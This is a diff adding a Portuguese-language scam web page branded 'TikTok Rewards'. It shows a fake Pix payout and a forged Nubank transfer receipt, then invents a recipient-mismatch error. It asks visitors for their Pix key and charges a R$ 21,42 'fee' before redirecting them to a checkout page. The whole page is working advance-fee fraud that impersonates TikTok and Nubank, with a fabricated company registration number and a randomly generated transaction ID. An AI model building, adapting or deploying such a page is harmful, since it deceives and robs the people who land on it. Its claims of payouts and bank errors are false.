@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<script src="/params.js"></script>
+<script src="/api/tt.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TikTok Rewards</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
+        body { font-family: 'Inter', sans-serif; margin: 0; background-color: #000; -webkit-tap-highlight-color: transparent; }
+        .tt-pink { background-color: #FE2C55; }
+        .nu-purple { background-color: #830AD1; }
+        .hidden { display: none; }
+
+        /* Estilo App Nubank */
+        .receipt-container { background-color: #ffffff; min-height: 100vh; color: #1a1a1a; position: relative; }
+        .label-gray { color: #767676; font-size: 14px; font-weight: 500; }
+        .value-dark { color: #1a1a1a; font-size: 16px; font-weight: 700; }
+        .divider { height: 1px; background-color: #f0f0f0; width: 100%; margin: 18px 0; }
+
+        #confirmBox {
+            position: fixed;
+            bottom: 0; left: 0; right: 0;
+            background: white;
+            padding: 28px 22px 48px 22px;
+            border-radius: 28px 28px 0 0;
+            box-shadow: 0 -15px 50px rgba(0,0,0,0.18);
+            transform: translateY(100%);
+            transition: transform 0.5s cubic-bezier(0.32, 1, 0.2, 1);
+            z-index: 1000;
+        }
+        #confirmBox.active { transform: translateY(0); }
+
+        .pulse-red { animation: pulse-red 2s infinite; }
+        @keyframes pulse-red {
+            0% { box-shadow: 0 0 0 0 rgba(254, 44, 85, 0.4); }
+            70% { box-shadow: 0 0 0 15px rgba(254, 44, 85, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(254, 44, 85, 0); }
+        }
+    </style>
+</head>
+<body>
+
+    <div id="step1" class="min-h-screen flex flex-col items-center justify-center px-8 text-center bg-[#121212]">
+        
+        <div class="w-24 h-24 bg-white/5 rounded-full flex items-center justify-center mb-8 border border-white/10 shadow-2xl">
+            <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#FE2C55" stroke-width="3"><polyline points="20 6 9 17 4 12"></polyline></svg>
+        </div>
+
+        <h2 class="text-white text-3xl font-black mb-4 leading-tight tracking-tight">Saque processado!</h2>
+        <p class="text-gray-400 text-lg mb-12 max-w-[280px] mx-auto leading-relaxed">O valor de <span class="text-white font-bold text-xl block mt-2">R$ 1.428,26</span> foi enviado para sua conta via Pix.</p>
+        
+        <button onclick="toStep2()" class="w-full tt-pink py-5 text-white font-black uppercase tracking-[0.2em] text-sm rounded-2xl active:scale-95 transition-all shadow-xl">
+            Ver comprovante pix
+        </button>
+    </div>
+
+    <div id="step2" class="hidden receipt-container">
+        <div class="flex justify-between items-center px-6 py-6 border-b border-gray-50">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2.5"><path d="M18 6L6 18M6 6l12 12"/></svg>
+            <img src="https://logospng.org/download/nubank/logo-nu-nubank-roxo-icon-1024.png" class="h-8">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#830AD1" stroke-width="2.5"><path d="M4 12v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8M16 6l-4-4-4 4M12 2v13"/></svg>
+        </div>
+
+        <div class="px-8 pt-10 pb-44">
+            <h1 class="text-[24px] font-bold text-[#1a1a1a] mb-10 tracking-tight">Comprovante de transferência</h1>
+            
+            <div class="mb-10">
+                <p class="label-gray mb-1">Valor</p>
+                <p class="text-[38px] font-bold text-[#1a1a1a] leading-tight">R$ 1.428,26</p>
+            </div>
+
+            <div class="space-y-1">
+                <div class="py-1">
+                    <p class="label-gray">Destinatário</p>
+                    <p class="value-dark mt-1">Maria dos Santos Souza</p>
+                    <p class="text-[#767676] text-[15px]">CPF: ***.361.***-**</p>
+                    <p class="text-[#767676] text-[15px]">Instituição: 181 - Nu Pagamentos S.A.</p>
+                </div>
+                <div class="divider"></div>
+                <div class="py-1">
+                    <p class="label-gray">Origem</p>
+                    <p class="value-dark mt-1 uppercase">TIKTOK REWARDS BRASIL</p>
+                    <p class="text-[#767676] text-[15px]">CNPJ: 13.141.251/0001-05</p>
+                </div>
+                <div class="divider"></div>
+                <div class="py-1">
+                    <p class="label-gray">ID da transação</p>
+                    <p class="text-[#767676] text-[13px] font-mono mt-2 break-all uppercase leading-relaxed" id="idTransacao"></p>
+                </div>
+                <div class="divider"></div>
+                <div class="py-1 text-center mt-8">
+                    <p class="label-gray mb-1">Data e Hora</p>
+                    <p class="value-dark" id="dataAtual"></p>
+                </div>
+            </div>
+
+            <div class="mt-16 flex justify-center">
+                <img src="https://logospng.org/download/nubank/logo-nu-nubank-roxo-icon-1024.png" class="h-10 opacity-[0.08] grayscale">
+            </div>
+        </div>
+
+        <div id="confirmBox">
+            <h3 class="text-[20px] font-black mb-2 text-gray-900">Este Pix é seu?</h3>
+            <p class="text-gray-500 text-[14px] mb-8 leading-relaxed">O TikTok identificou que os dados da conta de <b>Maria dos Santos Souza</b> não coincidem com o seu CPF. Deseja confirmar este envio de <b>R$ 1.428,26</b>?</p>
+            <div class="space-y-3">
+                <button class="w-full border-2 border-gray-100 text-gray-300 py-4 rounded-full font-bold text-xs uppercase tracking-widest">Sim, este Pix é meu</button>
+                <button onclick="toStep3()" class="w-full nu-purple text-white py-4 rounded-full font-bold text-[15px] shadow-xl uppercase tracking-wider active:scale-95 transition-all">NÃO, NÃO É MEU PIX!</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="step3" class="hidden bg-[#f8fafc] min-h-screen text-[#121212]">
+        <div class="bg-[#CC0000] text-white text-center py-4 px-4 text-[12px] font-black uppercase tracking-tight w-full sticky top-0 z-50">
+            ⚠️ ERRO NO PROCESSAMENTO: DIVERGÊNCIA DE DADOS IDENTIFICADA PELO SISTEMA BANCÁRIO
+        </div>
+
+        <div class="max-w-md mx-auto bg-white min-h-screen shadow-2xl pb-10">
+            <div class="flex justify-between items-center px-6 py-8 border-b border-gray-100">
+                <div class="flex flex-col">
+                    <span class="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Saldo Enviado Errado</span>
+                    <span class="text-4xl font-black text-red-600 tracking-tighter"> R$ 1.428,26</span>
+                </div>
+            </div>
+
+            <div class="px-6 py-10">
+                <div class="text-center mb-10">
+                    <div class="text-6xl mb-6">🔒</div>
+                    <h1 class="text-[26px] font-black text-slate-800 mb-2 leading-tight">Ativação de Proteção Pix</h1>
+                    <p class="text-sm font-bold text-red-600 bg-red-50 py-2 px-5 rounded-full inline-block">Erro de titularidade identificado.</p>
+                </div>
+
+                <div class="bg-gray-50 border-2 border-dashed border-red-200 rounded-[2rem] p-7 mb-10 text-[14px] text-gray-700 leading-relaxed font-medium">
+                    ⚠️ <b>Atenção:</b> Saques recentes foram revertidos por falha bancária e divergência de chave Pix. O sistema identificou que os dados informados não coincidem com o titular.
+                </div>
+
+                <div class="mb-10 space-y-5">
+                    <label class="block text-[11px] font-black text-gray-400 uppercase tracking-widest ml-1">Chave Pix Destino Correta:</label>
+                    <input type="text" placeholder="Digite sua Chave Pix aqui..." class="w-full p-5 rounded-2xl border-2 border-gray-100 bg-gray-50 text-lg font-bold focus:border-[#FE2C55] focus:outline-none shadow-inner">
+                </div>
+
+                <div class="bg-black rounded-[2rem] p-8 text-white text-center mb-8 pulse-red border-b-8 border-[#FE2C55]">
+                    <span class="text-[11px] uppercase font-black tracking-widest opacity-50">Taxa de Atualização de Vaga</span>
+                    <div class="text-5xl font-black my-3 tracking-tighter">R$ 21,42</div>
+                    <p class="text-[12px] font-black text-[#FE2C55]">LIBERAÇÃO IMEDIATA DO NOVO PIX</p>
+                </div>
+
+                <ahref="#" onclick="irParaCheckout(event)" class="block w-full tt-pink text-white text-center py-6 rounded-2xl shadow-xl font-black text-xl uppercase tracking-tight active:scale-95 transition-all">
+                    ✅ CONCLUIR COM SEGURANÇA
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function setupData() {
+            const d = new Date();
+            const months = ["Jan", "Fev", "Mar", "Abr", "Mai", "Jun", "Jul", "Ago", "Set", "Out", "Nov", "Dez"];
+            let eId = "E" + Math.floor(Math.random() * 1000000000).toString() + d.getTime().toString() + "7290KID";
+            document.getElementById('idTransacao').innerText = eId;
+            document.getElementById('dataAtual').innerText = `${d.getDate()} ${months[d.getMonth()]} ${d.getFullYear()} - ${d.getHours()}:${d.getMinutes().toString().padStart(2, '0')}:${d.getSeconds().toString().padStart(2, '0')}`;
+        }
+
+        function toStep2() {
+            setupData();
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+            window.scrollTo(0,0);
+            setTimeout(() => { document.getElementById('confirmBox').classList.add('active'); }, 2500);
+        }
+
+        function toStep3() {
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step3').classList.remove('hidden');
+            window.scrollTo(0,0);
+        }
+    </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<script src="pix-modal.js"></script>
+<script>
+function irParaCheckout(event) {
+  event.preventDefault();
+  var dest = new URL('checkout.html', window.location.href);
+  new URLSearchParams(window.location.search).forEach(function(v, k) {
+    dest.searchParams.set(k, v);
+  });
+  window.location.href = dest.toString();
+}
+</script>
+
+</body>
+</html>
